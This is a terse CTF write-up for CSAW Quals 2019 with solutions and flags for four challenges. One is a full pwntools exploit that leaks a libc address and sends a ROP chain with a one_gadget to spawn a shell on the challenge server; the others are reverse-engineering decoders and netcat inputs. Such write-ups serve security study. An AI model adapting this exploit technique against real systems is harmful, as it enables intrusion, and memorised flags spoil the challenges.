---
layout : default
---

# CSAW Quals 2019
16-09-2019

Don't have much time to explain everything, so enjoy the code.

## Baby Boi (PWN)

```py
from pwn import *

r = remote('pwn.chal.csaw.io', 1005)
context(os='linux',arch='amd64')

r.recvline()
printf_leak = r.recvline().split(': ')[1].replace('\n','')
printf_leak = int(printf_leak, 16)

libc = ELF("libc-2.27.so")
printf_addr = libc.symbols['printf']

libc_base = printf_leak - printf_addr

one_gadget = 0x4f2c5 # rcx=NULL
pop_rcx = 0x3eb0b
payload = 'A'*40
payload += p64(libc_base + pop_rcx)
payload += p64(0) # rcx = 0
payload += p64(libc_base + one_gadget)
log.info("payload : %s", payload)
r.sendline(payload)
r.interactive()
```

FLAG : flag{baby_boi_dodooo_doo_doo_dooo}

---

## Beleaf (RE)

```py
b = [119, 102, 123, 95, 110, 121, 125, 255, 98, 108, 114, 255, 255, 255, 255, 255, 255, 97, 101, 105, 255, 111, 116, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 103, 255, 255, 255, 255, 255, 255, 117, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0]
a = [1, 9, 17, 39, 2, 0, 18, 3, 8, 18, 9, 18, 17, 1, 3, 19, 4, 3, 5, 21, 46, 10, 3, 10, 18, 3, 1, 46, 22, 46, 10, 18, 6]
flag = ""
for i in a:
	flag += chr(b[i])
print flag
```

FLAG : flag{we_beleaf_in_your_re_future}

---

## Callsite (RE)

```
./callsite 400CBB ABC
```

argv[1] is the address of block containing code to print content of flag.txt

```
echo "400CBB ABC" | nc rev.chal.csaw.io 1001
```

FLAG : flag{you_got_the_call_site}

---

## Gibberish Check (RE)

I found the key "dsproxniujcvkhatlyfbA" passes all the constraints and get me the flag. I will re-write this part if I get some spare time.

```
echo "dsproxniujcvkhatlyfbA" | nc rev.chal.csaw.io 1000
```

FLAG : flag{first_ever_challenge}

---